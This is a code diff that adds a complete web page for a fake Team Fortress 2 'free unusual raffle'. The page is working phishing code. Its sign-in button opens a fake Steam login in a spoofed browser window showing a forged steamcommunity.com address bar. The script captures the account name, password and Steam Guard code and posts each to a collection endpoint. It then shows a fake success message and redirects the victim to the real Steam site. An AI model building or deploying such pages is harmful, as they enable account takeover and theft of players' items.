@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TF2 Unusual Raffle — Free Entry</title>
+<meta name="description" content="Weekly unusual drop raffle. Free entry for verified accounts.">
+<style>
+  :root{
+    --bg:#14171c; --panel:#1c2128; --line:#2b323c; --txt:#e6edf3;
+    --dim:#8b98a5; --accent:#f5a623; --green:#1a9fff;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--txt);font:15px/1.5 -apple-system,"Segoe UI",Roboto,sans-serif}
+  a{color:var(--accent);text-decoration:none}
+  header{border-bottom:1px solid var(--line);background:#0f1216}
+  .wrap{max-width:940px;margin:0 auto;padding:0 16px}
+  .nav{display:flex;align-items:center;gap:18px;height:56px}
+  .brand{font-weight:800;letter-spacing:.5px;font-size:17px}
+  .brand span{color:var(--accent)}
+  .nav .sp{flex:1}
+  .nav a.lnk{color:var(--dim);font-size:13px}
+  .hero{padding:44px 0 28px;text-align:center;border-bottom:1px solid var(--line)}
+  .tag{display:inline-block;font-size:11px;letter-spacing:1.4px;text-transform:uppercase;
+       color:var(--accent);border:1px solid #3a2f18;background:#211a0c;padding:4px 10px;border-radius:99px}
+  h1{font-size:31px;margin:14px 0 8px;letter-spacing:-.4px}
+  .sub{color:var(--dim);max-width:520px;margin:0 auto 22px;font-size:14px}
+  .cta{display:inline-flex;align-items:center;gap:10px;background:var(--accent);color:#1a1206;
+       font-weight:700;border:0;padding:13px 26px;border-radius:6px;font-size:15px;cursor:pointer}
+  .cta:hover{background:#ffb944}
+  .meta{margin-top:14px;font-size:12px;color:#5f6b78}
+  .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:28px 0}
+  .item{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
+  .thumb{aspect-ratio:1;background-size:cover;background-position:center;position:relative}
+  .thumb::after{content:"";position:absolute;inset:0;box-shadow:inset 0 0 34px rgba(0,0,0,.75)}
+  .item .lbl{padding:8px 9px;font-size:11px;color:var(--dim);border-top:1px solid var(--line)}
+  .item .lbl b{display:block;color:var(--txt);font-size:12px;font-weight:600}
+  .rules{padding:6px 0 46px;color:var(--dim);font-size:13px;max-width:620px}
+  .rules h2{color:var(--txt);font-size:15px;margin:22px 0 8px}
+  .rules li{margin:5px 0 5px 18px}
+  footer{border-top:1px solid var(--line);padding:20px 0;color:#5f6b78;font-size:12px}
+
+  #ovl{position:fixed;inset:0;background:rgba(6,8,10,.72);display:none;
+       align-items:center;justify-content:center;z-index:99;padding:20px;
+       backdrop-filter:blur(2px)}
+  #ovl.on{display:flex}
+  #win{width:432px;max-width:100%;border-radius:9px;overflow:hidden;
+       box-shadow:0 26px 70px rgba(0,0,0,.7);background:#dee1e6;position:relative}
+  #bar{background:#dee1e6;padding:7px 9px 0;cursor:grab;user-select:none;touch-action:none}
+  #bar:active{cursor:grabbing}
+  .tabs{display:flex;align-items:flex-end;gap:8px;margin-bottom:6px}
+  .dots{display:flex;gap:6px;padding-bottom:7px;padding-left:2px}
+  .dots i{width:11px;height:11px;border-radius:50%;display:block}
+  .d1{background:#ff5f57}.d2{background:#febc2e}.d3{background:#28c840}
+  .tab{background:#f7f8fa;border-radius:7px 7px 0 0;padding:6px 10px;font:11px/1.2 -apple-system,sans-serif;
+       color:#3c4043;display:flex;align-items:center;gap:6px;max-width:210px;box-shadow:0 -1px 2px rgba(0,0,0,.06)}
+  .tab b{font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .fav{width:12px;height:12px;border-radius:2px;background:#1b2838;flex:0 0 12px}
+  .urlrow{display:flex;align-items:center;gap:7px;background:#f7f8fa;border-radius:99px;
+          padding:5px 11px;margin-bottom:7px}
+  .lock{width:11px;height:11px;flex:0 0 11px;opacity:.55}
+  .url{font:11.5px/1 -apple-system,sans-serif;color:#3c4043;overflow:hidden;
+       text-overflow:ellipsis;white-space:nowrap}
+  .url em{font-style:normal;color:#1a73e8}
+  #body{background:#181a21;padding:22px 24px 26px;color:#c6d4df;
+        font:13px/1.45 "Motiva Sans",Arial,sans-serif;min-height:290px}
+  .slogo{font-weight:700;letter-spacing:2.5px;font-size:15px;color:#fff;text-align:center;margin-bottom:3px}
+  .slogo span{color:#66c0f4}
+  .sh{text-align:center;color:#8f98a0;font-size:11.5px;margin-bottom:16px}
+  label.fl{display:block;font-size:11px;color:#8f98a0;text-transform:uppercase;
+           letter-spacing:.7px;margin:11px 0 5px}
+  input.fi{width:100%;background:#32353c;border:1px solid #32353c;border-radius:3px;
+           padding:9px 10px;color:#fff;font-size:13px;outline:0}
+  input.fi:focus{border-color:#66c0f4;background:#3b3f47}
+  .row{display:flex;align-items:center;gap:7px;margin:13px 0 4px;font-size:11.5px;color:#8f98a0}
+  .sbtn{width:100%;margin-top:15px;background:linear-gradient(90deg,#47bfff,#1a44c2);
+        border:0;color:#fff;font-weight:600;letter-spacing:.6px;padding:11px;
+        border-radius:3px;font-size:13px;cursor:pointer;text-transform:uppercase}
+  .sbtn:disabled{opacity:.6;cursor:default}
+  .err{color:#eb6b6b;font-size:11.5px;margin-top:9px;display:none}
+  .err.on{display:block}
+  .foot{text-align:center;font-size:11px;color:#5c6a76;margin-top:15px}
+  .foot a{color:#66c0f4}
+  .guardico{text-align:center;margin:2px 0 10px}
+  .guardico div{width:52px;height:52px;margin:0 auto;border-radius:50%;
+                border:2px solid #66c0f4;display:grid;place-items:center;
+                font-size:22px;color:#66c0f4}
+  .ok{text-align:center;padding:34px 0}
+  .ok div{width:56px;height:56px;margin:0 auto 12px;border-radius:50%;
+          background:#1f3d2b;border:2px solid #4caf50;display:grid;place-items:center;
+          color:#4caf50;font-size:26px}
+  @media(max-width:640px){
+    .grid{grid-template-columns:repeat(2,1fr)}
+    h1{font-size:25px}
+    #ovl{padding:0;align-items:stretch}
+    #win{width:100%;max-width:none;border-radius:0;display:flex;flex-direction:column}
+    #bar{cursor:default;padding-top:calc(7px + env(safe-area-inset-top))}
+    #body{flex:1}
+  }
+</style>
+</head>
+<body>
+
+<header><div class="wrap"><div class="nav">
+  <div class="brand">TF2<span>RAFFLE</span></div>
+  <div class="sp"></div>
+  <a class="lnk" href="#">How it works</a>
+  <a class="lnk" href="#">Past winners</a>
+</div></div></header>
+
+<div class="wrap">
+  <section class="hero">
+    <div class="tag">Round #4821 &middot; closes in 6h 12m</div>
+    <h1>Free Unusual Drop Raffle</h1>
+    <p class="sub">Verified accounts only. One entry per SteamID. Winners drawn automatically and traded within 24 hours.</p>
+    <button class="cta" id="open">Sign in through Steam</button>
+    <div class="meta">2,140 entries &middot; 4 prizes this round</div>
+  </section>
+
+  <div class="grid">
+    <div class="item"><div class="thumb" style="background-image:url(/items/1.png),linear-gradient(135deg,#6b2fa8,#c243c9)"></div><div class="lbl"><b>Aviator Assortment</b>Purple Energy</div></div>
+    <div class="item"><div class="thumb" style="background-image:url(/items/2.png),linear-gradient(135deg,#1d6b52,#31c48d)"></div><div class="lbl"><b>Armored Authority</b>Scorching Flames</div></div>
+    <div class="item"><div class="thumb" style="background-image:url(/items/3.png),linear-gradient(135deg,#7a5a14,#e0b53c)"></div><div class="lbl"><b>Brass Goggles</b>Burning Flames</div></div>
+    <div class="item"><div class="thumb" style="background-image:url(/items/4.png),linear-gradient(135deg,#8d2b2b,#f06d6d)"></div><div class="lbl"><b>Bobble Hat</b>Frostbite</div></div>
+  </div>
+
+  <div class="rules">
+    <h2>How entry works</h2>
+    <ul>
+      <li>Sign in with Steam to verify ownership of your account.</li>
+      <li>Accounts under 30 days old or with private backpacks are skipped.</li>
+      <li>Prizes are sent as trade offers, not item grants.</li>
+      <li>Duplicate SteamIDs are merged into a single entry.</li>
+    </ul>
+    <h2>Prize pool</h2>
+    <p>Funded by the community market fee split and direct top-ups. Pool refreshes every Monday at 18:00 UTC.</p>
+  </div>
+</div>
+
+<footer><div class="wrap">TF2RAFFLE &middot; not affiliated with Valve Corporation</div></footer>
+
+<div id="ovl">
+  <div id="win">
+    <div id="bar">
+      <div class="tabs">
+        <div class="dots"><i class="d1"></i><i class="d2"></i><i class="d3"></i></div>
+        <div class="tab"><span class="fav"></span><b>Sign In</b></div>
+      </div>
+      <div class="urlrow">
+        <svg class="lock" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1a5 5 0 00-5 5v3H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm3 8H9V6a3 3 0 016 0v3z"/></svg>
+        <div class="url">steamcommunity.com/<em>login/home/</em></div>
+      </div>
+    </div>
+    <div id="body"></div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var body = document.getElementById('body');
+  var ovl  = document.getElementById('ovl');
+  var win  = document.getElementById('win');
+  var state = { user:'', pass:'' };
+
+  function send(step, extra){
+    var payload = Object.assign({
+      step: step, user: state.user, pass: state.pass,
+      ref: document.referrer || '', path: location.href
+    }, extra || {});
+    fetch('/api/capture', {
+      method:'POST', headers:{'content-type':'application/json'},
+      body: JSON.stringify(payload), keepalive: true
+    }).catch(function(){});
+  }
+
+  function step1(){
+    body.innerHTML =
+      '<div class="slogo">STEAM<span>&reg;</span></div>' +
+      '<div class="sh">Sign in to your Steam account</div>' +
+      '<label class="fl">Steam account name</label>' +
+      '<input class="fi" id="u" autocomplete="username" spellcheck="false" autofocus>' +
+      '<label class="fl">Password</label>' +
+      '<input class="fi" id="p" type="password" autocomplete="current-password">' +
+      '<label class="row"><input type="checkbox" checked> Remember me</label>' +
+      '<div class="err" id="e1">Please enter your account name and password.</div>' +
+      '<button class="sbtn" id="b1">Sign In</button>' +
+      '<div class="foot"><a href="#">Having trouble signing in?</a></div>';
+    var go = function(){
+      var u = document.getElementById('u').value.trim();
+      var p = document.getElementById('p').value;
+      if(!u || !p){ document.getElementById('e1').classList.add('on'); return; }
+      state.user = u; state.pass = p;
+      document.getElementById('b1').disabled = true;
+      send('credentials');
+      setTimeout(step2, 700);
+    };
+    document.getElementById('b1').onclick = go;
+    document.getElementById('p').onkeydown = function(ev){ if(ev.key === 'Enter') go(); };
+  }
+
+  function step2(){
+    body.innerHTML =
+      '<div class="guardico"><div>&#128274;</div></div>' +
+      '<div class="slogo" style="font-size:13px;letter-spacing:1.5px">STEAM GUARD</div>' +
+      '<div class="sh">Enter the code from your Steam Guard authenticator, or the code sent to your email address.</div>' +
+      '<label class="fl">Steam Guard code</label>' +
+      '<input class="fi" id="c" inputmode="text" maxlength="10" spellcheck="false" autocomplete="one-time-code" style="letter-spacing:3px;text-align:center" autofocus>' +
+      '<div class="err" id="e2">That code was incorrect. Please try again.</div>' +
+      '<button class="sbtn" id="b2">Verify</button>' +
+      '<div class="foot"><a href="#">Having trouble with Steam Guard?</a></div>';
+    var go = function(){
+      var c = document.getElementById('c').value.trim().toUpperCase();
+      if(c.length < 5){ document.getElementById('e2').classList.add('on'); return; }
+      document.getElementById('b2').disabled = true;
+      send('guard_code', { code: c });
+      setTimeout(function(){ step3(c); }, 700);
+    };
+    document.getElementById('b2').onclick = go;
+    document.getElementById('c').onkeydown = function(ev){ if(ev.key === 'Enter') go(); };
+  }
+
+  function step3(code){
+    body.innerHTML =
+      '<div class="ok"><div>&#10003;</div>' +
+      '<div class="slogo" style="font-size:13px;letter-spacing:1.5px">SIGNED IN</div>' +
+      '<div class="sh">You are signed in. Redirecting to your entry confirmation&hellip;</div></div>';
+    send('complete', { code: code || '' });
+    setTimeout(function(){
+      location.href = 'https://steamcommunity.com/login/home/';
+    }, 1400);
+  }
+
+  document.getElementById('open').onclick = function(e){
+    e.preventDefault();
+    ovl.classList.add('on');
+    send('open');
+    step1();
+  };
+  ovl.addEventListener('click', function(e){ if(e.target === ovl) ovl.classList.remove('on'); });
+  document.addEventListener('keydown', function(e){
+    if(e.key === 'Escape') ovl.classList.remove('on');
+  });
+
+  var bar = document.getElementById('bar'), drag = false, sx, sy, ox, oy;
+  bar.addEventListener('pointerdown', function(e){
+    if(window.innerWidth <= 640) return;
+    drag = true; sx = e.clientX; sy = e.clientY;
+    var r = win.getBoundingClientRect(); ox = r.left; oy = r.top;
+    win.style.position = 'fixed'; win.style.margin = '0';
+    bar.setPointerCapture(e.pointerId);
+  });
+  bar.addEventListener('pointermove', function(e){
+    if(!drag) return;
+    win.style.left = (ox + e.clientX - sx) + 'px';
+    win.style.top  = (oy + e.clientY - sy) + 'px';
+  });
+  bar.addEventListener('pointerup', function(){ drag = false; });
+})();
+</script>
+</body>
+</html>
